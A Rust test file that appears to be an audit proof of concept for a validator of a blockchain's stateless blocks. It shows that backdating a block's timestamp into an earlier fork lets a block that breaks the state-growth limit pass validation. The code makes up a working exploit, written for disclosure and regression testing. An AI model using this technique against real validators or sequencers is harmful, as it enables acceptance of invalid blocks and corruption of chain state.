//! AUDIT PoC (Soundness / High) — END-TO-END "accept-invalid" under a backdated fork.
//!
//! `validate_block` (crates/stateless-core/src/executor.rs) selects BOTH the EVM ruleset
//! (`MegaSpecId` via `create_evm_env` -> `chain_spec.spec_id(header.timestamp)`) and the per-fork
//! block resource limits (`chain_spec.hardfork(header.timestamp)` ->
//! `BlockLimits::from_hardfork_and_block_gas_limit`) SOLELY from the attacker-controlled
//! `header.timestamp`. Nothing on the validate path binds that timestamp to the parent
//! (`BlockMeta` carries no timestamp; `ValidatedBlock::verify_continuity` only checks
//! state/withdrawals roots).
//!
//! mega-evm's per-transaction (and per-block) state-growth limit is `u64::MAX` (unlimited) under
//! the `MiniRex` fork and `1000` under every `Rex..Rex5` fork
//! (`mega_evm::constants::rex::TX_STATE_GROWTH_LIMIT`). A transaction that grows state past `1000`
//! entries halts with `OutOfGas` under `Rex` (the tx is still included, as a *failed* receipt, with
//! its state reverted), but runs to completion under `MiniRex`.
//!
//! This test builds a REAL `(block, SaltWitness, MptWitness, contracts)` and calls the REAL
//! `validate_block`, proving:
//!   * with `header.timestamp` in the MiniRex window (no limit): a block whose single tx grows
//!     state by >1000 storage slots VALIDATES (`validate_block` -> `Ok`), and
//!   * with the SAME block re-timestamped into the Rex window (limit 1000): it is REJECTED
//!     (`validate_block` -> `Err`), because the state-growth tx halts and the recomputed
//!     receipts/state/gas no longer match the header.
//!
//! i.e. the validator ACCEPTS, under an attacker-chosen (backdated) fork, a block the honest (Rex)
//! chain would REJECT — a soundness "accept-invalid".

use std::{
    cell::RefCell,
    collections::{BTreeMap, BTreeSet},
};

use alloy_consensus::{Header, Signed, TxEip1559, transaction::Recovered};
use alloy_eips::eip2935::{HISTORY_SERVE_WINDOW, HISTORY_STORAGE_ADDRESS};
use alloy_genesis::Genesis;
use alloy_primitives::{
    Address, B256, Bloom, Bytes, Signature, TxKind, U256, address, map::HashMap as AlloyHashMap,
};
use alloy_rpc_types_eth::{BlockTransactions, Header as RpcHeader};
// mega-evm's no-op external env: returns MIN_BUCKET_SIZE (256) for every bucket capacity and
// no oracle storage — exactly the (default) capacity our from-scratch witness will carry, so
// the recording run and the witness-backed validate_block run execute identically.
use mega_evm::{EmptyExternalEnv, MegaHardforks};
use op_alloy_consensus::OpTxEnvelope;
use reth_trie_common::EMPTY_ROOT_HASH;
use revm::{
    DatabaseRef,
    primitives::KECCAK_EMPTY,
    state::{AccountInfo, Bytecode},
};
use salt::{EphemeralSaltState, MemStore, StateRoot, Witness, hasher};
use stateless_core::{
    ValidationError,
    chain_spec::ChainSpec,
    data_types::{Account, PlainKey, PlainValue},
    evm_database::WitnessDatabaseError,
    executor::{replay_block, validate_block},
    withdrawals::MptWitness,
};

// ---- fixed synthetic accounts ------------------------------------------------------------------

const SENDER: Address = address!("00000000000000000000000000000000000000aa");
const CONTRACT: Address = address!("00000000000000000000000000000000000000cc");
// OP sequencer fee recipient (block beneficiary); any address works.
const COINBASE: Address = address!("4200000000000000000000000000000000000011");

/// Number of distinct fresh storage slots the contract writes. Must be > 1000 (the Rex per-tx
/// state-growth limit) so that under Rex the tx halts, while under MiniRex it succeeds.
const N_SLOTS: u16 = 1010;

const BLOCK_NUMBER: u64 = 1000;
const GAS_LIMIT: u64 = 4_000_000_000; // > MiniRex storage-gas cost of ~2M * N_SLOTS

// ---- EVM bytecode: N first-time SSTOREs to distinct slots (each = +1 state growth) -------------

/// `for i in 1..=n { SSTORE(slot=i, value=i) }; STOP`.
///
/// `PUSH2 i` (value) `PUSH2 i` (key) `SSTORE`: SSTORE pops key (top) then value, storing the
/// non-zero value `i` at the previously-zero slot `i`, i.e. +1 net state growth per iteration.
fn sstore_growth_bytecode(n: u16) -> Bytes {
    let mut code = Vec::with_capacity(n as usize * 7 + 1);
    for i in 1..=n {
        code.push(0x61); // PUSH2 (value)
        code.extend_from_slice(&i.to_be_bytes());
        code.push(0x61); // PUSH2 (key)
        code.extend_from_slice(&i.to_be_bytes());
        code.push(0x55); // SSTORE
    }
    code.push(0x00); // STOP
    Bytes::from(code)
}

// ---- a DatabaseRef over the (tiny) full pre-state that records every accessed plain key ---------

/// Serves the exact same pre-state the SALT `MemStore` holds (a funded sender + the contract), and
/// records every account/storage key the block executor reads. That recorded set is precisely the
/// witness `lookups` needed so the witness-backed replay serves every read.
#[derive(Debug)]
struct RecordingDb {
    accounts: BTreeMap<Address, AccountInfo>,
    code: AlloyHashMap<B256, Bytecode>,
    parent_hash: B256,
    number: u64,
    reads: RefCell<BTreeSet<Vec<u8>>>,
}

impl DatabaseRef for RecordingDb {
    type Error = WitnessDatabaseError;

    fn basic_ref(&self, address: Address) -> Result<Option<AccountInfo>, Self::Error> {
        self.reads.borrow_mut().insert(PlainKey::Account(address).encode());
        Ok(self.accounts.get(&address).cloned())
    }

    fn code_by_hash_ref(&self, code_hash: B256) -> Result<Bytecode, Self::Error> {
        if code_hash == KECCAK_EMPTY {
            return Ok(Bytecode::new_raw(Bytes::new()));
        }
        self.code
            .get(&code_hash)
            .cloned()
            .ok_or_else(|| WitnessDatabaseError("code not found".to_string()))
    }

    fn storage_ref(&self, address: Address, index: U256) -> Result<U256, Self::Error> {
        self.reads.borrow_mut().insert(PlainKey::Storage(address, index.into()).encode());
        // The pre-state has no storage: every slot reads as zero (proven absent in the witness).
        Ok(U256::ZERO)
    }

    fn block_hash_ref(&self, number: u64) -> Result<B256, Self::Error> {
        // Mirror WitnessDatabase::block_hash_ref: parent hash comes from the header directly, older
        // hashes from EIP-2935 history storage (all zero here).
        if number == self.number - 1 {
            return Ok(self.parent_hash);
        }
        self.storage_ref(HISTORY_STORAGE_ADDRESS, U256::from(number % HISTORY_SERVE_WINDOW as u64))
            .map(Into::into)
    }
}

// ---- helpers -----------------------------------------------------------------------------------

/// A staggered MegaETH fork schedule so that fork choice depends on the timestamp:
/// `MiniRex` at t=0 (no state-growth limit), `Rex` at a later timestamp (limit 1000). Includes the
/// op/eth forks MegaETH always has active (all at t=0) so `apply_pre_execution_changes` works.
fn staggered_chain_spec() -> ChainSpec {
    let mut genesis = Genesis::default();
    genesis.config.chain_id = 4326;

    // op/eth forks active from genesis (MegaETH always runs post-Isthmus/Prague).
    for (k, t) in [
        ("shanghaiTime", 0u64),
        ("cancunTime", 0),
        ("pragueTime", 0),
        ("bedrockBlock", 0),
        ("regolithTime", 0),
        ("canyonTime", 0),
        ("ecotoneTime", 0),
        ("fjordTime", 0),
        ("graniteTime", 0),
        ("holoceneTime", 0),
        ("isthmusTime", 0),
    ] {
        genesis.config.extra_fields.insert_value(k.to_string(), t).unwrap();
    }
    // Mega forks, staggered: MiniRex from 0, Rex from a large timestamp.
    for (k, t) in [
        ("miniRexTime", MINI_REX_TS_FLOOR),
        ("miniRex1Time", REX_TS - 300),
        ("miniRex2Time", REX_TS - 200),
        ("rexTime", REX_TS),
    ] {
        genesis.config.extra_fields.insert_value(k.to_string(), t).unwrap();
    }

    ChainSpec::from_genesis(genesis)
}

const MINI_REX_TS_FLOOR: u64 = 0;
/// Attacker's backdated timestamp: inside the MiniRex window `[0, miniRex1Time)`.
const ATTACKER_TS: u64 = 1;
/// Honest timestamp: inside the Rex window (>= rexTime).
const REX_TS: u64 = 1_800_000_000;
const HONEST_TS: u64 = REX_TS + 10;

/// Build the RPC block (a single EIP-1559 tx calling the state-growth contract) at `timestamp`,
/// with the given (possibly placeholder) header roots.
fn build_block(
    timestamp: u64,
    parent_hash: B256,
    state_root: B256,
    receipts_root: B256,
    logs_bloom: Bloom,
    gas_used: u64,
) -> alloy_rpc_types_eth::Block<op_alloy_rpc_types::Transaction> {
    // A single EIP-1559 transaction: sender -> contract, no value, empty input. The signature is a
    // placeholder and the recovered signer is set explicitly — the block-execution path uses the
    // provided sender and never re-recovers or verifies the signature.
    let tx = TxEip1559 {
        chain_id: 4326,
        nonce: 0,
        gas_limit: GAS_LIMIT,
        max_fee_per_gas: 0,
        max_priority_fee_per_gas: 0,
        to: TxKind::Call(CONTRACT),
        value: U256::ZERO,
        access_list: Default::default(),
        input: Bytes::new(),
    };
    let signed = Signed::new_unchecked(tx, Signature::test_signature(), B256::ZERO);
    let envelope = OpTxEnvelope::Eip1559(signed);
    let recovered = Recovered::new_unchecked(envelope, SENDER);
    let op_tx = op_alloy_rpc_types::Transaction {
        inner: alloy_rpc_types_eth::Transaction {
            inner: recovered,
            block_hash: None,
            block_number: None,
            transaction_index: None,
            effective_gas_price: None,
        },
        deposit_nonce: None,
        deposit_receipt_version: None,
    };

    let header = Header {
        parent_hash,
        beneficiary: COINBASE,
        state_root,
        receipts_root,
        logs_bloom,
        number: BLOCK_NUMBER,
        gas_limit: GAS_LIMIT,
        gas_used,
        timestamp,
        base_fee_per_gas: Some(0),
        withdrawals_root: Some(EMPTY_ROOT_HASH),
        parent_beacon_block_root: Some(B256::ZERO),
        difficulty: U256::ZERO,
        blob_gas_used: Some(0),
        excess_blob_gas: Some(0),
        ..Default::default()
    };

    alloy_rpc_types_eth::Block {
        header: RpcHeader { hash: B256::ZERO, inner: header, total_difficulty: None, size: None },
        uncles: Vec::new(),
        transactions: BlockTransactions::Full(vec![op_tx]),
        withdrawals: None,
    }
}

/// Flatten Revm's per-account bundle into plain (key -> optional value) SALT updates, exactly as
/// `validate_block` does (executor.rs), so the witness's `updates` cover precisely what the
/// validator will re-apply post-replay.
fn flatten_writes(
    accounts: &AlloyHashMap<Address, revm::database::states::BundleAccount>,
) -> BTreeMap<Vec<u8>, Option<Vec<u8>>> {
    let mut writes = BTreeMap::new();
    for (address, bundle_account) in accounts {
        if bundle_account.info != bundle_account.original_info {
            let account = bundle_account.info.as_ref().map(|info| Account {
                nonce: info.nonce,
                balance: info.balance,
                codehash: (info.code_hash != KECCAK_EMPTY).then_some(info.code_hash),
            });
            let key = PlainKey::Account(*address).encode();
            let value =
                account.and_then(|a| (!a.is_empty()).then(|| PlainValue::Account(a).encode()));
            writes.insert(key, value);
        }
        for (slot, v) in &bundle_account.storage {
            if v.previous_or_original_value != v.present_value {
                let key = PlainKey::Storage(*address, B256::new(slot.to_be_bytes())).encode();
                let value = (!v.present_value.is_zero())
                    .then(|| PlainValue::Storage(v.present_value).encode());
                writes.insert(key, value);
            }
        }
    }
    writes
}

#[test]
fn e2e_accept_invalid_under_backdated_minirex_fork() {
    let chain_spec = staggered_chain_spec();

    // Sanity: the fork/spec really is chosen from the timestamp alone.
    assert_eq!(chain_spec.spec_id(ATTACKER_TS), mega_evm::MegaSpecId::MINI_REX);
    assert_eq!(chain_spec.spec_id(HONEST_TS), mega_evm::MegaSpecId::REX);
    assert_eq!(chain_spec.hardfork(ATTACKER_TS), Some(mega_evm::MegaHardfork::MiniRex));
    assert_eq!(chain_spec.hardfork(HONEST_TS), Some(mega_evm::MegaHardfork::Rex));

    // ---- pre-state: funded sender + the state-growth contract ----------------------------------
    let bytecode = Bytecode::new_raw(sstore_growth_bytecode(N_SLOTS));
    let code_hash = bytecode.hash_slow();

    let sender_acct = Account { nonce: 0, balance: U256::from(10u128.pow(18)), codehash: None };
    let contract_acct = Account { nonce: 1, balance: U256::ZERO, codehash: Some(code_hash) };

    // Plain (key -> value) pre-state for the SALT store.
    let mut pre_state: BTreeMap<Vec<u8>, Option<Vec<u8>>> = BTreeMap::new();
    pre_state.insert(
        PlainKey::Account(SENDER).encode(),
        Some(PlainValue::Account(sender_acct).encode()),
    );
    pre_state.insert(
        PlainKey::Account(CONTRACT).encode(),
        Some(PlainValue::Account(contract_acct).encode()),
    );

    // Contract bytecode cache (WitnessDatabase serves code from here).
    let mut contracts: AlloyHashMap<B256, Bytecode> = AlloyHashMap::default();
    contracts.insert(code_hash, bytecode.clone());

    let parent_hash = B256::repeat_byte(0x11);

    // ---- 1. recording run under MiniRex: collect accessed keys + the write set -----------------
    let mut db_accounts = BTreeMap::new();
    db_accounts.insert(
        SENDER,
        AccountInfo {
            balance: sender_acct.balance,
            nonce: sender_acct.nonce,
            code_hash: KECCAK_EMPTY,
            code: None,
        },
    );
    db_accounts.insert(
        CONTRACT,
        AccountInfo {
            balance: contract_acct.balance,
            nonce: contract_acct.nonce,
            code_hash,
            code: Some(bytecode.clone()),
        },
    );
    let recording_db = RecordingDb {
        accounts: db_accounts,
        code: contracts.clone(),
        parent_hash,
        number: BLOCK_NUMBER,
        reads: RefCell::new(BTreeSet::new()),
    };

    let probe_block = build_block(ATTACKER_TS, parent_hash, B256::ZERO, B256::ZERO, Bloom::ZERO, 0);
    let (accounts, output) =
        replay_block(&chain_spec, &probe_block, &recording_db, EmptyExternalEnv, None)
            .expect("MiniRex recording replay must succeed (no state-growth limit)");

    let reads: Vec<Vec<u8>> = recording_db.reads.borrow().iter().cloned().collect();
    let writes = flatten_writes(&accounts);
    println!(
        "recording run (MiniRex): {} accessed keys, {} state writes, gas_used={}",
        reads.len(),
        writes.len(),
        output.gas_used
    );
    // The single tx really did grow state by > 1000 slots (plus a few system/account writes).
    let storage_writes = writes
        .keys()
        .filter(|k| matches!(PlainKey::decode(k), PlainKey::Storage(addr, _) if addr == CONTRACT))
        .count();
    assert!(
        storage_writes >= N_SLOTS as usize,
        "expected >= {N_SLOTS} fresh contract storage writes, got {storage_writes}"
    );

    // ---- 2. build the SALT MemStore pre-state + pre-state root ----------------------------------
    let store = MemStore::new();
    let pre_updates = EphemeralSaltState::new(&store).update_fin(&pre_state).unwrap();
    store.update_state(pre_updates.clone());
    let (pre_root, trie_updates) = StateRoot::new(&store).update_fin(&pre_updates).unwrap();
    store.update_trie(trie_updates);

    // ---- 3. build the witness over the PRE-state (reads = lookups, writes = updates) -----------
    // bucket_ids must cover every accessed/written key so WitnessExternalEnv::get_bucket_capacity
    // resolves during replay (existing-key lookups do not add bucket metadata by themselves).
    let bucket_ids: Vec<salt::BucketId> =
        reads.iter().chain(writes.keys()).map(|k| hasher::bucket_id(k)).collect();

    let witness = Witness::create(bucket_ids, reads.iter(), &writes, &store)
        .expect("witness creation over the pre-state must succeed");
    assert_eq!(
        witness.state_root().expect("witness carries a state root"),
        pre_root,
        "witness must commit to the pre-state root",
    );
    witness.verify().expect("freshly built witness must verify");
    let salt_witness = witness.salt_witness;

    // Empty L2ToL1MessagePasser withdrawal trie (the block performs no withdrawals).
    let mpt_witness = MptWitness { storage_root: EMPTY_ROOT_HASH, state: Vec::new() };

    // ---- 4. assemble the honest MiniRex header ------------------------------------------------
    // receipts_root/logs_bloom/gas_used come straight from the (identical) MiniRex execution; the
    // post-state root is calibrated below via validate_block's own StateRootMismatch feedback (the
    // exact value the honest sequencer would publish).
    let mut block = build_block(
        ATTACKER_TS,
        parent_hash,
        B256::ZERO, // state_root placeholder — calibrated next
        output.receipts_root,
        output.logs_bloom,
        output.gas_used,
    );

    // Calibrate the header state root by consulting validate_block's own recomputation. Any other
    // error here would be a real coverage/logic bug, so surface it.
    for _ in 0..3 {
        match validate_block(
            &chain_spec,
            &block,
            salt_witness.clone(),
            mpt_witness.clone(),
            &contracts,
            None,
        ) {
            Ok(_) => break,
            Err(ValidationError::StateRootMismatch { actual, .. }) => {
                block.header.inner.state_root = actual;
            }
            Err(e) => panic!("unexpected error while calibrating the honest header: {e:?}"),
        }
    }

    // ---- 5. THE PROOF -------------------------------------------------------------------------
    // (a) Under the backdated MiniRex timestamp (no state-growth limit): ACCEPTED.
    let minirex = validate_block(
        &chain_spec,
        &block,
        salt_witness.clone(),
        mpt_witness.clone(),
        &contracts,
        None,
    );
    assert!(
        minirex.is_ok(),
        "MiniRex (backdated) must ACCEPT the state-growth block, got: {minirex:?}"
    );

    // (b) The SAME block, re-timestamped into the Rex window (state-growth limit 1000): REJECTED.
    let mut rex_block = block.clone();
    rex_block.header.inner.timestamp = HONEST_TS;
    let rex = validate_block(
        &chain_spec,
        &rex_block,
        salt_witness.clone(),
        mpt_witness.clone(),
        &contracts,
        None,
    );
    assert!(rex.is_err(), "Rex (honest) must REJECT the same block, but it validated");

    // (c) Corroborate the CAUSE: re-executing the identical tx under Rex halts on the state-growth
    // limit, reverting all >1000 slot writes — that divergence is exactly what makes the recomputed
    // roots mismatch the (MiniRex-honest) header above.
    let rex_probe_db = RecordingDb {
        accounts: recording_db.accounts.clone(),
        code: contracts.clone(),
        parent_hash,
        number: BLOCK_NUMBER,
        reads: RefCell::new(BTreeSet::new()),
    };
    let rex_probe_block =
        build_block(HONEST_TS, parent_hash, B256::ZERO, B256::ZERO, Bloom::ZERO, 0);
    let (rex_accounts, rex_output) =
        replay_block(&chain_spec, &rex_probe_block, &rex_probe_db, EmptyExternalEnv, None)
            .expect("Rex replay itself succeeds; the growth tx is included as a failed receipt");
    let rex_writes = flatten_writes(&rex_accounts);
    let rex_storage_writes = rex_writes
        .keys()
        .filter(|k| matches!(PlainKey::decode(k), PlainKey::Storage(addr, _) if addr == CONTRACT))
        .count();
    assert_eq!(
        rex_storage_writes, 0,
        "under Rex the state-growth tx must halt and revert all its slot writes (got {rex_storage_writes})",
    );
    assert_ne!(
        rex_output.gas_used, output.gas_used,
        "Rex vs MiniRex gas must differ (halt vs full execution)"
    );
    println!(
        "  cause: under Rex the growth tx HALTS -> contract storage writes {} (vs {} under MiniRex), \
         gas_used {} (vs {} under MiniRex)",
        rex_storage_writes, storage_writes, rex_output.gas_used, output.gas_used,
    );

    println!(
        "\nEND-TO-END accept-invalid PROVEN:\n  \
         backdated MiniRex (ts={ATTACKER_TS}, no state-growth limit) -> validate_block = Ok\n  \
         honest   Rex     (ts={HONEST_TS}, state-growth limit 1000) -> validate_block = Err({:?})\n  \
         same (block, witness); only header.timestamp differs.",
        rex.unwrap_err(),
    );
}
